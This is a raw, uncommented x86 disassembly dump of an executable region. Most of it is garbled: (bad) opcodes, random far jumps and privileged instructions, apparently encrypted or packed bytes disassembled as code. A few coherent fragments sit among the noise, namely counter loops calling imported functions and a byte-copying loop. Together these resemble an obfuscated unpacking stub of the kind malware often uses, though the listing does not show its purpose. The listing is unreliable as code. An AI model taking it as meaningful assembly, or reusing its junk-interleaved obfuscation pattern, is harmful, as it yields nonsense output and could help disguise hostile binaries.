  40f25b:	jns    0x40f2d5
  40f25d:	push   edx
  40f25e:	jno    0x40f25c
  40f260:	pushf  
  40f261:	lea    ebp,[edx]
  40f263:	mov    ah,0x88
  40f265:	pop    es
  40f266:	das    
  40f267:	jl     0x40f2a9
  40f269:	pop    esp
  40f26a:	push   eax
  40f26b:	jbe    0x40f23b
  40f26d:	cmp    ecx,DWORD PTR [edi+0x7bab214]
  40f273:	jecxz  0x40f287
  40f275:	lods   eax,DWORD PTR ds:[esi]
  40f276:	mov    edi,0x4f06f67b
  40f27b:	js     0x40f213
  40f27d:	jmp    0x323b:0x728e2560
  40f284:	jecxz  0x40f2d9
  40f286:	mov    esp,0x35d5e043
  40f28b:	jle    0x40f234
  40f28d:	iret   
  40f28e:	or     bl,BYTE PTR ds:0x35dfe8fc
  40f294:	add    al,0x39
  40f296:	jb     0x40f25e
  40f298:	(bad)  
  40f299:	xor    eax,0x621539ca
  40f29e:	call   0x167ffdb
  40f2a3:	xchg   BYTE PTR [eax-0x1ad5d7d2],al
  40f2a9:	loop   0x40f2d2
  40f2ab:	sbb    ebx,esp
  40f2ad:	jmp    0x40f2d6
  40f2af:	sar    BYTE PTR [ebp+0x68],1
  40f2b2:	xor    al,0x93
  40f2b4:	aas    
  40f2b5:	mov    ecx,0x126f87c8
  40f2ba:	mov    WORD PTR [eax-0x515e00d6],es
  40f2c0:	add    DWORD PTR [esi+0x14],eax
  40f2c3:	add    eax,0xd377b169
  40f2c8:	mov    DWORD PTR [esp+eiz*8-0x157c7194],edi
  40f2cf:	scas   eax,DWORD PTR es:[edi]
  40f2d0:	xchg   edx,eax
  40f2d1:	jnp    0x40f273
  40f2d3:	pop    edx
  40f2d4:	or     eax,0x9f4e8d58
  40f2d9:	push   0xdcd62b4c
  40f2de:	push   0x9704cd50
  40f2e3:	test   eax,0x7f1af5eb
  40f2e8:	inc    edx
  40f2e9:	pop    esp
  40f2ea:	mov    esp,0xe2793332
  40f2ef:	cmc    
  40f2f0:	inc    ecx
  40f2f1:	arpl   WORD PTR [ebx+0x23],si
  40f2f4:	iret   
  40f2f5:	(bad)  
  40f2f6:	mov    fs,WORD PTR [ecx]
  40f2f8:	icebp  
  40f2f9:	or     DWORD PTR [edi+0x65],ebx
  40f2fc:	or     DWORD PTR [eax],0xa8e0d4f1
  40f302:	into   
  40f303:	popf   
  40f304:	lock and eax,0x8c2ac370
  40f30a:	mov    esi,0x5bb1ebfc
  40f30f:	lods   eax,DWORD PTR ds:[esi]
  40f310:	xor    al,dh
  40f312:	sbb    eax,DWORD PTR [ecx+0x2a]
  40f315:	push   ebp
  40f316:	outs   dx,DWORD PTR ds:[esi]
  40f317:	jmp    0xfb10:0x392ccf47
  40f31e:	adc    eax,0xf0ee2933
  40f323:	dec    esp
  40f324:	aaa    
  40f325:	adc    dl,0xd2
  40f328:	test   al,0x48
  40f32a:	mov    al,0xae
  40f32c:	push   ebp
  40f32d:	and    DWORD PTR [esi+0x71b1edb8],eax
  40f333:	mov    ah,0x5e
  40f335:	push   esp
  40f336:	lock pop esp
  40f338:	adc    esi,DWORD PTR [esi-0x25]
  40f33b:	lahf   
  40f33c:	pop    esp
  40f33d:	shl    DWORD PTR [ebp-0x56],cl
  40f340:	mov    ah,0x17
  40f342:	sbb    eax,0xddd7ad46
  40f347:	jmp    0x7c29:0xb556867
  40f34e:	or     ebx,esp
  40f350:	jle    0x40f328
  40f352:	sbb    ebp,esi
  40f354:	cld    
  40f355:	in     eax,0xbe
  40f357:	sbb    al,0x58
  40f359:	mov    ecx,0xecffb11
  40f35e:	pop    ds
  40f35f:	jge    0x40f3ab
  40f361:	mov    al,0xfa
  40f363:	in     al,0x1a
  40f365:	mov    esi,0x45923d72
  40f36a:	out    dx,al
  40f36b:	pop    ebp
  40f36c:	sub    edx,DWORD PTR [eax]
  40f36e:	xchg   DWORD PTR [esi],ecx
  40f370:	pop    ss
  40f371:	adc    BYTE PTR [ecx-0x667c8052],bl
  40f377:	push   0x56
  40f379:	test   BYTE PTR [esi+0x7e72a80e],bl
  40f37f:	mov    bh,0x8
  40f381:	jnp    0x40f33b
  40f383:	xor    DWORD PTR [ebp+0x2581f89c],eax
  40f389:	daa    
  40f38a:	aaa    
  40f38b:	inc    ebx
  40f38c:	add    BYTE PTR [eax],al
  40f38e:	add    BYTE PTR [eax],al
  40f390:	add    BYTE PTR [ebx],dh
  40f392:	leave  
  40f393:	xor    ecx,DWORD PTR ds:0x433727
  40f399:	inc    ecx
  40f39a:	mov    DWORD PTR ds:0x433727,ecx
  40f3a0:	cmp    DWORD PTR ds:0x433727,0x7
  40f3a7:	jne    0x40f3b6
  40f3ad:	push   DWORD PTR [ebp-0x14]
  40f3b0:	call   DWORD PTR ds:0x41236c
  40f3b6:	cmp    DWORD PTR ds:0x433727,0x6
  40f3bd:	jne    0x40f3d0
  40f3c3:	mov    ecx,DWORD PTR ds:0x433727
  40f3c9:	inc    ecx
  40f3ca:	mov    DWORD PTR ds:0x433727,ecx
  40f3d0:	cmp    DWORD PTR ds:0x433727,0x17
  40f3d7:	jb     0x40f391
  40f3dd:	mov    edx,DWORD PTR ds:0x43362b
  40f3e3:	mov    ecx,DWORD PTR ds:0x433703
  40f3e9:	sub    edx,ecx
  40f3eb:	sub    edx,DWORD PTR [edx+ecx*1]
  40f3ee:	mov    DWORD PTR [ebp-0x8],eax
  40f3f1:	mov    DWORD PTR ds:0x433657,0x13
  40f3fb:	cmp    DWORD PTR ds:0x433657,0x0
  40f402:	je     0x40f4d8
  40f408:	cmp    DWORD PTR ds:0x433657,0x14
  40f40f:	jne    0x40f41b
  40f415:	call   DWORD PTR ds:0x412370
  40f41b:	mov    edx,DWORD PTR ds:0x433657
  40f421:	dec    edx
  40f422:	mov    DWORD PTR ds:0x433657,edx
  40f428:	jmp    0x40f3fb
  40f42d:	and    DWORD PTR ds:0x4336ef,0x0
  40f437:	mov    ecx,DWORD PTR ds:0x4336ef
  40f43d:	inc    ecx
  40f43e:	mov    DWORD PTR ds:0x4336ef,ecx
  40f444:	cmp    DWORD PTR ds:0x4336ef,0x8
  40f44b:	jne    0x40f45a
  40f451:	push   DWORD PTR [ebp-0x28]
  40f454:	call   DWORD PTR ds:0x4122ac
  40f45a:	cmp    DWORD PTR ds:0x4336ef,0x7
  40f461:	jne    0x40f474
  40f467:	mov    ecx,DWORD PTR ds:0x4336ef
  40f46d:	inc    ecx
  40f46e:	mov    DWORD PTR ds:0x4336ef,ecx
  40f474:	cmp    DWORD PTR ds:0x4336ef,0x15
  40f47b:	jb     0x40f437
  40f481:	and    DWORD PTR ds:0x4336db,0x0
  40f48b:	mov    edx,DWORD PTR ds:0x4336db
  40f491:	inc    edx
  40f492:	mov    DWORD PTR ds:0x4336db,edx
  40f498:	cmp    DWORD PTR ds:0x4336db,0x21
  40f49f:	jne    0x40f4bf
  40f4a5:	push   0x8bd6
  40f4aa:	push   0x433891
  40f4af:	push   0x4338e7
  40f4b4:	push   0x4338cb
  40f4b9:	call   DWORD PTR ds:0x4122b0
  40f4bf:	cmp    DWORD PTR ds:0x4336db,0x19
  40f4c6:	jb     0x40f48b
  40f4cc:	mov    ecx,DWORD PTR ds:0x433717
  40f4d2:	adc    DWORD PTR ds:0x433727,ecx
  40f4d8:	mov    DWORD PTR [ebp-0x4],0xf89c8532
  40f4df:	mov    edx,DWORD PTR [ebp-0x8]
  40f4e2:	push   esi
  40f4e3:	mov    ecx,0x7510854
  40f4e8:	xor    edx,ecx
  40f4ea:	mov    esi,0x32729b
  40f4ef:	push   edi
  40f4f0:	mov    edi,DWORD PTR [ebp+0x10]
  40f4f3:	add    edx,esi
  40f4f5:	cmp    edi,edx
  40f4f7:	je     0x40fbae
  40f4fd:	mov    edx,DWORD PTR [ebp-0x8]
  40f500:	mov    eax,DWORD PTR [ebp-0x4]
  40f503:	xor    eax,ecx
  40f505:	mov    edi,0xffcd8d65
  40f50a:	sub    edi,eax
  40f50c:	add    edi,DWORD PTR [ebp+0x10]
  40f50f:	xor    edx,ecx
  40f511:	add    edx,esi
  40f513:	cmp    edx,edi
  40f515:	ja     0x40fba9
  40f51b:	push   ebx
  40f51c:	jmp    0x40f526
  40f521:	mov    esi,0x32729b
  40f526:	mov    eax,DWORD PTR [ebp-0x8]
  40f529:	mov    edi,DWORD PTR [ebp-0x4]
  40f52c:	jmp    0x40f84b
  40f531:	and    al,0x6b
  40f533:	sbb    dl,BYTE PTR [esi+0x71]
  40f536:	push   edi
  40f537:	jo     0x40f5a2
  40f539:	dec    esi
  40f53a:	add    edi,DWORD PTR [eax-0x291d34c7]
  40f540:	xchg   esp,eax
  40f541:	aam    0xac
  40f543:	jle    0x40f5c3
  40f545:	jl     0x40f5c4
  40f547:	jle    0x40f5c7
  40f549:	cmp    edi,DWORD PTR [eax]
  40f54b:	mov    ds:0xfdf8055b,al
  40f550:	jle    0x40f5ac
  40f552:	jmp    0x35af:0xb9b9aedc
  40f559:	jp     0x40f581
  40f55b:	xor    al,0x5
  40f55d:	in     al,0x71
  40f55f:	pop    esp
  40f560:	mov    bl,0x1
  40f562:	fidivr DWORD PTR [edx-0xb180b63]
  40f568:	jb     0x40f5da
  40f56a:	jmp    0x40f58a
  40f56c:	and    BYTE PTR [edi],ch
  40f56e:	rcr    bh,0x74
  40f571:	push   esi
  40f572:	adc    ebx,esi
  40f574:	rcr    BYTE PTR [ecx*2+0xe465840],cl
  40f57b:	dec    ebx
  40f57c:	push   0xe60d9d8
  40f581:	inc    esi
  40f582:	cmp    esi,DWORD PTR [ebx]
  40f584:	fnstcw WORD PTR [ebx-0x16b2d0d4]
  40f58a:	xor    esi,DWORD PTR [ebp-0x5b]
  40f58d:	push   cs
  40f58e:	popa   
  40f58f:	call   0xd4bd:0x2e6e5a5a
  40f596:	mov    edi,0xc2e15a9d
  40f59b:	int3   
  40f59c:	scas   al,BYTE PTR es:[edi]
  40f59d:	arpl   si,cx
  40f59f:	or     edx,0xc23ba6ff
  40f5a5:	dec    esp
  40f5a6:	add    BYTE PTR [edi+0x49],dh
  40f5a9:	or     ecx,DWORD PTR [eax+0x2]
  40f5ac:	je     0x40f56a
  40f5ae:	nop
  40f5af:	push   ecx
  40f5b0:	in     al,dx
  40f5b1:	jnp    0x40f5df
  40f5b3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f5b4:	adc    eax,0xa5cb6af0
  40f5b9:	adc    al,0x74
  40f5bc:	mov    cl,0xca
  40f5be:	(bad)
  40f5c1:	mov    esi,0x7dd086ab
  40f5c6:	jmp    0x40f5a1
  40f5c8:	mov    eax,0x4ab58e4d
  40f5cd:	dec    eax
  40f5ce:	cmp    eax,0xdd2843c1
  40f5d3:	push   ecx
  40f5d4:	adc    cl,BYTE PTR [ecx]
  40f5d6:	into   
  40f5d7:	es sti 
  40f5d9:	add    dh,BYTE PTR [eax+0xc]
  40f5dc:	rcr    BYTE PTR [edx],0x35
  40f5df:	xchg   edx,eax
  40f5e0:	iret   
  40f5e1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f5e2:	test   al,0x57
  40f5e4:	cmp    esp,DWORD PTR [ebx+0x34d8a381]
  40f5ea:	cmp    DWORD PTR [eax-0x55130547],ecx
  40f5f0:	pop    esi
  40f5f1:	mov    ecx,0xbefeecaa
  40f5f6:	mov    ecx,0xe7c82af7
  40f5fb:	fild   WORD PTR ds:[ecx+0x4684c70]
  40f602:	and    DWORD PTR [edi-0x5bbce6d7],ecx
  40f608:	test   BYTE PTR [edi-0xc1df595],ah
  40f60e:	popf   
  40f60f:	sub    dh,ah
  40f611:	std    
  40f612:	aam    0x72
  40f614:	sahf   
  40f615:	and    eax,0x2160f0f7
  40f61a:	leave  
  40f61b:	lds    eax,FWORD PTR [edi+edx*1]
  40f61e:	retf   
  40f61f:	shl    BYTE PTR [edx+edx*2+0x28ae287c],0x7
  40f627:	dec    ebx
  40f628:	pop    edx
  40f629:	imul   DWORD PTR [eax-0x29f6038a]
  40f62f:	ins    BYTE PTR es:[edi],dx
  40f630:	(bad)  
  40f632:	and    esp,DWORD PTR [esi+0x62]
  40f635:	mov    dl,0x5a
  40f637:	add    DWORD PTR [eax],eax
  40f639:	or     DWORD PTR ss:[ecx-0x7d],esp
  40f63d:	fdiv   st,st(2)
  40f63f:	mov    bh,BYTE PTR ds:0xba9d72e5
  40f645:	push   es
  40f646:	mov    dh,0xec
  40f648:	nop
  40f649:	test   ecx,eax
  40f64b:	cmp    ebp,ebp
  40f64d:	dec    ecx
  40f64e:	scas   eax,DWORD PTR es:[edi]
  40f64f:	ins    DWORD PTR es:[edi],dx
  40f650:	clts   
  40f652:	cmp    DWORD PTR [esi],esi
  40f654:	ins    DWORD PTR es:[edi],dx
  40f655:	and    bh,ch
  40f657:	(bad)  
  40f658:	mov    al,ds:0xbe70a9e6
  40f65d:	inc    ebp
  40f65e:	xchg   edx,eax
  40f65f:	xchg   ebp,eax
  40f660:	fsub   QWORD PTR [ebx]
  40f662:	popa   
  40f663:	(bad)  
  40f664:	mov    dl,0x7f
  40f666:	lods   al,BYTE PTR ds:[esi]
  40f667:	mov    esp,0x6bd7b401
  40f66c:	xor    eax,0x5b42a8f9
  40f671:	fimul  DWORD PTR [edi-0x2e]
  40f674:	jne    0x40f645
  40f676:	sbb    bh,dh
  40f678:	fucom  st(0)
  40f67a:	mov    dh,0xc3
  40f67c:	jnp    0x40f65d
  40f67e:	jge    0x40f648
  40f680:	scas   eax,DWORD PTR es:[edi]
  40f681:	es retf 0x9725
  40f685:	call   0x2124edf2
  40f68a:	fs mov dl,0xc
  40f68d:	out    dx,al
  40f68e:	sub    BYTE PTR [ecx-0x7f],cl
  40f691:	(bad)  [ecx+0x69a58124]
  40f697:	adc    al,0x6b
  40f699:	pop    es
  40f69a:	adc    DWORD PTR [ebx-0x69],eax
  40f69d:	xchg   DWORD PTR [edx],esi
  40f69f:	icebp  
  40f6a0:	jnp    0x40f67a
  40f6a2:	cmp    BYTE PTR [esi],bh
  40f6a4:	dec    ebx
  40f6a5:	(bad)  
  40f6a6:	sti    
  40f6a7:	xchg   ah,al
  40f6a9:	xor    DWORD PTR [ecx+eiz*8-0x3],edi
  40f6ad:	and    BYTE PTR [esi-0x14ebb5ff],ah
  40f6b3:	in     eax,0x7d
  40f6b5:	jmp    0x40f6ed
  40f6b7:	cld    
  40f6b8:	out    0x1a,al
  40f6ba:	pusha  
  40f6bb:	xor    eax,0xfa68f3d5
  40f6c0:	jp     0x40f677
  40f6c2:	(bad)  
  40f6c3:	fadd   QWORD PTR [eax-0x5b]
  40f6c6:	sbb    ah,0xb4
  40f6c9:	and    DWORD PTR [edx-0x4b],ebx
  40f6cc:	pop    ebx
  40f6cd:	and    dl,BYTE PTR [ecx-0x31e05e48]
  40f6d3:	cmp    BYTE PTR [edi+0x4f],0x43
  40f6d7:	or     DWORD PTR [eax+0x41],0x20
  40f6db:	jmp    0xf555edc4
  40f6e0:	test   BYTE PTR [edx+edx*1],0xbb
  40f6e4:	sbb    DWORD PTR [eax-0x5a],ebx
  40f6e7:	inc    edi
  40f6e8:	outs   dx,BYTE PTR ds:[esi]
  40f6e9:	pop    ss
  40f6ea:	pop    ebx
  40f6eb:	jl     0x40f727
  40f6ed:	and    al,dl
  40f6ef:	ins    BYTE PTR es:[edi],dx
  40f6f0:	mov    edx,0xc9ac963
  40f6f5:	fst    DWORD PTR [edx+esi*1+0x58c3a2e6]
  40f6fc:	jnp    0x40f70e
  40f6fe:	fs jl  0x40f75a
  40f701:	int3   
  40f702:	pop    es
  40f703:	std    
  40f704:	dec    DWORD PTR [eax-0x14]
  40f707:	sbb    bh,BYTE PTR gs:[ebp-0x1f]
  40f70b:	inc    esp
  40f70c:	aas    
  40f70d:	xchg   BYTE PTR [esi+0x7],al
  40f710:	sub    al,0xa
  40f712:	outs   dx,BYTE PTR ds:[esi]
  40f713:	sbb    DWORD PTR [esi-0x627d70b5],ebp
  40f719:	inc    ebx
  40f71a:	adc    edx,esp
  40f71c:	mov    bl,0x9f
  40f71e:	ret    0x4ac9
  40f721:	out    dx,eax
  40f722:	cmc    
  40f723:	sub    al,0x89
  40f725:	in     eax,dx
  40f726:	punpckhbw mm0,mm6
  40f729:	xchg   esp,eax
  40f72a:	mov    BYTE PTR [ebp+0x6eb429a3],al
  40f730:	sub    BYTE PTR ds:0xec4c0dc5,ch
  40f736:	aam    0xa4
  40f738:	cwde   
  40f739:	inc    DWORD PTR ds:0x48ae74d
  40f73f:	dec    ebx
  40f740:	jmp    0x40f71a
  40f742:	iret   
  40f743:	bound  edi,QWORD PTR [ecx+0x3f578410]
  40f749:	add    al,0xaa
  40f74b:	adc    eax,0xd8e244e9
  40f750:	(bad)  
  40f751:	adc    esi,DWORD PTR [eax]
  40f753:	div    bh
  40f755:	push   cs
  40f756:	inc    ebp
  40f757:	or     eax,0x492c4c4e
  40f75c:	fsub   st(2),st
  40f75e:	push   ebp
  40f75f:	pop    esp
  40f760:	mov    WORD PTR [ecx-0x65],gs
  40f763:	jl     0x40f70d
  40f765:	outs   dx,BYTE PTR ds:[esi]
  40f766:	mov    WORD PTR [ecx],es
  40f768:	fild   DWORD PTR cs:[ebx-0x52]
  40f76c:	shl    ah,0x4f
  40f76f:	sahf   
  40f770:	ja     0x40f7e2
  40f772:	pusha  
  40f773:	addr16 call 0x37ab:0x567da6dd
  40f77b:	jge    0x40f757
  40f77d:	stos   BYTE PTR es:[edi],al
  40f77e:	fistp  DWORD PTR [edi+0x634ec071]
  40f784:	adc    DWORD PTR [esi],ecx
  40f786:	mov    ds:0x960b69d8,eax
  40f78b:	addr16 (bad) 
  40f78d:	adc    al,0xea
  40f78f:	jg     0x40f7f6
  40f791:	pop    ss
  40f792:	repz mov ebp,0x3968598b
  40f798:	arpl   si,si
  40f79a:	in     al,dx
  40f79b:	jnp    0x40f787
  40f79d:	lds    esp,FWORD PTR ds:0xf7f28bdf
  40f7a3:	mov    ch,BYTE PTR [eax-0x61f435d1]
  40f7a9:	jg     0x40f828
  40f7ab:	call   0x76ad:0x68ae73ef
  40f7b2:	pop    ebx
  40f7b3:	ret    
  40f7b4:	fdiv   DWORD PTR [ebp-0x47]
  40f7b7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f7b8:	bound  edi,QWORD PTR [ecx-0x5b0558d2]
  40f7be:	dec    eax
  40f7bf:	in     al,0xfa
  40f7c1:	and    ebp,DWORD PTR [ecx]
  40f7c3:	jl     0x40f76f
  40f7c5:	gs fs cdq 
  40f7c8:	mov    ebp,esi
  40f7ca:	rcr    ch,1
  40f7cc:	sbb    eax,0x80ebc22b
  40f7d1:	mov    edx,0x89098ba6
  40f7d6:	mov    ch,BYTE PTR [ebp+ebx*8-0x592f2b7c]
  40f7dd:	xor    edi,DWORD PTR [esi+0x59]
  40f7e0:	adc    DWORD PTR ds:0x77dbf9d8,edx
  40f7e6:	ror    DWORD PTR [edi+0x4b],0xa4
  40f7ea:	xor    eax,0x61299017
  40f7ef:	adc    al,BYTE PTR [edi]
  40f7f1:	push   ebx
  40f7f2:	test   DWORD PTR [edx-0x25ae6eab],ecx
  40f7f8:	bound  edx,QWORD PTR [esp+edi*4]
  40f7fb:	jbe    0x40f871
  40f7fd:	push   ecx
  40f7fe:	arpl   WORD PTR [edx+0x2f3f2244],cx
  40f804:	aaa    
  40f805:	arpl   WORD PTR [ebx],sp
  40f807:	or     DWORD PTR [ecx+esi*1+0x2f37f9fa],esi
  40f80e:	enter  0xa181,0xd1
  40f812:	inc    eax
  40f813:	xchg   ebx,eax
  40f814:	(bad)  
  40f816:	fnstenv [ecx]
  40f818:	jl     0x40f7dd
  40f81a:	mov    dh,0xca
  40f81c:	mov    edi,0xb5038db4
  40f821:	add    ebp,DWORD PTR [eax+0x27]
  40f824:	test   al,bl
  40f826:	fldenv [ecx+0x49c30da0]
  40f82c:	mov    ebp,0x8fed36e0
  40f831:	enter  0xb031,0x1e
  40f835:	dec    ecx
  40f836:	mov    ebx,0x61953777
  40f83b:	push   ebp
  40f83c:	loop   0x40f80d
  40f83e:	(bad)  [esi]
  40f840:	or     edx,DWORD PTR [ecx-0x134c5815]
  40f846:	pop    bx
  40f848:	cs cmp eax,0x3f933e8
  40f84e:	dec    BYTE PTR [ebx-0x50f0f78b]
  40f854:	cli    
  40f855:	mov    ebx,DWORD PTR [ebp+0xc]
  40f858:	xor    eax,ecx
  40f85a:	add    eax,edx
  40f85c:	mov    al,BYTE PTR [ebx+eax*1+0x32729b]
  40f863:	mov    BYTE PTR [edi+esi*1],al
  40f866:	mov    eax,DWORD PTR [ebp-0x4]
  40f869:	xor    eax,ecx
  40f86b:	lea    edx,[edx+eax*1+0x32729b]
  40f872:	mov    eax,DWORD PTR [ebp-0x4]
  40f875:	xor    eax,ecx
  40f877:	mov    esi,0xffcd8d65
  40f87c:	sub    esi,eax
  40f87e:	add    esi,DWORD PTR [ebp+0x10]
  40f881:	cmp    edx,esi
  40f883:	jmp    0x40fba2
  40f888:	and    BYTE PTR [edi],0xc2
  40f88b:	in     eax,0x61
  40f88d:	loope  0x40f830
  40f88f:	arpl   WORD PTR [ecx-0x4b],bp
  40f892:	adc    eax,0x61c8703f
  40f897:	sbb    eax,0x7e7eabd2
  40f89c:	jl     0x40f91b
  40f89e:	jle    0x40f91e
  40f8a0:	pop    es
  40f8a1:	mov    bh,0xb6
  40f8a3:	cs push esp
  40f8a5:	test   ch,al
  40f8a7:	fwait
  40f8a8:	ds dec ebp
  40f8aa:	adc    al,0xca
  40f8ac:	mov    bl,0x96
  40f8ae:	mov    ecx,0xff87e17a
  40f8b3:	inc    esi
  40f8b4:	mov    al,BYTE PTR [eax+eiz*2-0x31]
  40f8b8:	aad    0x5e
  40f8ba:	mov    ch,BYTE PTR [ecx]
  40f8bc:	push   edi
  40f8bd:	pop    ebx
  40f8be:	inc    ebp
  40f8bf:	lahf   
  40f8c0:	sub    BYTE PTR [edi],0xb6
  40f8c3:	xor    ebp,ebx
  40f8c5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f8c6:	in     al,0x85
  40f8c8:	lahf   
  40f8c9:	inc    esp
  40f8ca:	or     esp,DWORD PTR ds:0x631a342a
  40f8d0:	ret    
  40f8d1:	cmp    eax,0x547a10c
  40f8d6:	inc    edi
  40f8d7:	adc    al,0xff
  40f8d9:	pop    esp
  40f8da:	mov    edx,0x4a5fcd85
  40f8df:	or     ch,BYTE PTR [eax-0x7e]
  40f8e2:	and    DWORD PTR [ebp-0x5a],ebx
  40f8e5:	xor    edx,esi
  40f8e7:	jnp    0x40f8d2
  40f8e9:	loopne 0x40f8b0
  40f8eb:	adc    BYTE PTR [edi+0x3],dh
  40f8ee:	in     al,0x95
  40f8f0:	adc    ebp,DWORD PTR [esi+eiz*2-0x26]
  40f8f4:	(bad)  
  40f8f5:	xor    eax,0x8b5f15ac
  40f8fa:	mov    esi,?
  40f8fc:	loope  0x40f8bc
  40f8fe:	test   BYTE PTR [eax-0x64221273],dl
  40f904:	xchg   esi,eax
  40f905:	inc    eax
  40f906:	dec    edi
  40f907:	mov    ebx,0xa5df063d
  40f90c:	repz popa 
  40f90e:	push   DWORD PTR [eax+edi*4]
  40f911:	mov    dl,0xb4
  40f913:	mov    edi,edx
  40f915:	adc    DWORD PTR [ebx+0x47],edi
  40f918:	fadd   QWORD PTR [edi*8-0x5cb80de7]
  40f91f:	jo     0x40f90f
  40f921:	inc    esp
  40f922:	mov    dh,0x1
  40f924:	mov    ah,0x80
  40f926:	jg     0x40f8e0
  40f928:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f929:	mov    ?,WORD PTR [ebx]
  40f92b:	and    al,0x49
  40f92d:	lock or esp,esi
  40f930:	inc    esi
  40f931:	mov    edi,0x9a00529c
  40f936:	jl     0x40f990
  40f938:	out    0x70,eax
  40f93a:	push   0xffffffe9
  40f93c:	pop    esp
  40f93d:	jle    0x40f995
  40f93f:	xor    eax,0xe55bc583
  40f944:	hlt    
  40f945:	cmp    dh,dh
  40f947:	sbb    al,0xbd
  40f949:	adc    DWORD PTR [esp+esi*2-0x11],edi
  40f94d:	(bad)  
  40f94e:	xor    ch,BYTE PTR [esi+0x30]
  40f951:	aaa    
  40f952:	fcom   QWORD PTR [ebx-0x6096f343]
  40f958:	or     BYTE PTR [edi],bh
  40f95a:	xor    al,0x6f
  40f95c:	inc    ebx
  40f95d:	xor    al,0x1d
  40f95f:	mov    edi,0xcb3ad053
  40f964:	xchg   ecx,eax
  40f965:	div    BYTE PTR [eax]
  40f967:	in     al,0xeb
  40f969:	loope  0x40f930
  40f96b:	daa    
  40f96c:	jmp    0x40f8fd
  40f96e:	std    
  40f96f:	jno    0x40f999
  40f971:	popa   
  40f972:	pop    edx
  40f973:	jge    0x40f99c
  40f975:	(bad)  
  40f976:	fadd   QWORD PTR [edi]
  40f978:	test   al,0xa6
  40f97a:	mov    edx,0xe9ffa270
  40f97f:	sbb    eax,0x346a85e9
  40f984:	mov    ah,0x24
  40f986:	call   0x16c99245
  40f98b:	push   edi
  40f98c:	pop    eax
  40f98d:	inc    ebp
  40f98e:	pop    eax
  40f98f:	(bad)  
  40f990:	pop    DWORD PTR [edx-0x58dd8ac2]
  40f996:	scas   al,BYTE PTR es:[edi]
  40f997:	mov    esi,0x7d15f63e
  40f99c:	adc    BYTE PTR [edx-0x6e],ah
  40f99f:	sub    ecx,DWORD PTR [esp+esi*4+0x2f]
  40f9a3:	add    DWORD PTR [edx+0x42],0x33a4f158
  40f9aa:	inc    esp
  40f9ab:	pop    ebp
  40f9ac:	add    al,0x5b
  40f9ae:	sbb    eax,0x2dd2bfbf
  40f9b3:	mov    al,ds:0x4cb53da7
  40f9b8:	add    al,0x2c
  40f9ba:	mov    dh,0x8b
  40f9bc:	or     eax,0x9b384330
  40f9c1:	(bad)
  40f9c5:	mov    esp,0xbe38035c
  40f9ca:	or     edi,DWORD PTR [ebx-0x6a]
  40f9cd:	aad    0x7a
  40f9cf:	ds pop ds
  40f9d1:	xlat   BYTE PTR ds:[ebx]
  40f9d2:	test   BYTE PTR [ebx],al
  40f9d4:	inc    ecx
  40f9d5:	push   ecx
  40f9d6:	(bad)  
  40f9d7:	xchg   edx,eax
  40f9d8:	jo     0x40f9a8
  40f9da:	and    al,0x70
  40f9dc:	lds    esp,FWORD PTR [ebx-0x4f]
  40f9df:	mov    ah,0xf7
  40f9e1:	push   0xffffffb9
  40f9e3:	clc    
  40f9e4:	ja     0x40f976
  40f9e6:	inc    edx
  40f9e7:	arpl   WORD PTR [edx],si
  40f9e9:	xchg   edx,eax
  40f9ea:	sar    DWORD PTR [eax],cl
  40f9ec:	push   esp
  40f9ed:	js     0x40f990
  40f9ef:	jge    0x40f984
  40f9f1:	nop
  40f9f2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f9f3:	fidiv  WORD PTR [ecx+ebp*4+0x75]
  40f9f7:	test   ah,bh
  40f9f9:	cld    
  40f9fa:	pop    edx
  40f9fb:	(bad)  
  40f9fc:	hlt    
  40f9fd:	jge    0x40fa5f
  40f9ff:	mov    al,ds:0x44a0c86d
  40fa04:	aam    0x94
  40fa06:	or     al,0x5
  40fa08:	pop    esp
  40fa09:	retf   0xa7cd
  40fa0c:	or     ebx,esp
  40fa0e:	sub    bl,BYTE PTR [ebx+0x1f5164bf]
  40fa14:	fcom   DWORD PTR [edi+0x66]
  40fa17:	sbb    BYTE PTR [eax-0x115ceeae],dl
  40fa1d:	sub    BYTE PTR [esi-0x47ca322e],dl
  40fa23:	cwde   
  40fa24:	push   ss
  40fa25:	and    BYTE PTR [ebx+0x405218f0],dl
  40fa2b:	sbb    al,0xcf
  40fa2d:	adc    al,0xc4
  40fa2f:	push   0xffffffde
  40fa31:	xchg   edx,eax
  40fa32:	cli    
  40fa33:	mov    esp,ecx
  40fa35:	sbb    ecx,edi
  40fa37:	adc    al,0xef
  40fa39:	lds    edi,FWORD PTR [ebx+0x4ce31314]
  40fa3f:	gs pop ecx
  40fa41:	ret    
  40fa42:	sub    al,0x46
  40fa44:	jns    0x40fa3f
  40fa46:	xchg   edx,eax
  40fa47:	jmp    0x9f4f00df
  40fa4c:	xor    dh,BYTE PTR [edi+0x2ddc8ace]
  40fa52:	add    bh,BYTE PTR [esi]
  40fa54:	push   ebx
  40fa55:	mov    esp,0x62e30023
  40fa5a:	cmp    BYTE PTR [esp+ebx*2],al
  40fa5d:	fstp   DWORD PTR [edx+0x7c91813f]
  40fa63:	xlat   BYTE PTR ds:[ebx]
  40fa64:	cmp    eax,0xffffff81
  40fa67:	data16 loope 0x40fa69
  40fa6a:	leave  
  40fa6b:	inc    edi
  40fa6c:	jp     0x40fa7b
  40fa6e:	jmp    DWORD PTR [esi]
  40fa70:	jecxz  0x40fa28
  40fa72:	in     eax,0xe8
  40fa74:	(bad)  [esi-0x17e53d4f]
  40fa7a:	jg     0x40fa81
  40fa7c:	adc    eax,0xfe2d0492
  40fa81:	int    0x2f
  40fa83:	sbb    bh,BYTE PTR [edi]
  40fa85:	push   0xffffffa9
  40fa87:	mov    esp,0xdbdd069c
  40fa8c:	mov    cl,0x7
  40fa8e:	out    dx,eax
  40fa8f:	mov    al,0xd9
  40fa91:	js     0x40fab4
  40fa93:	pushf  
  40fa94:	sbb    edx,DWORD PTR [esi-0x78]
  40fa97:	mul    DWORD PTR [esi+0x795d5cef]
  40fa9d:	xchg   ebp,eax
  40fa9e:	xchg   edx,eax
  40fa9f:	les    esi,FWORD PTR [edi]
  40faa1:	add    al,0x3
  40faa3:	dec    ebp
  40faa4:	pop    esp
  40faa5:	dec    edx
  40faa6:	les    edi,FWORD PTR [ecx]
  40faa8:	cld    
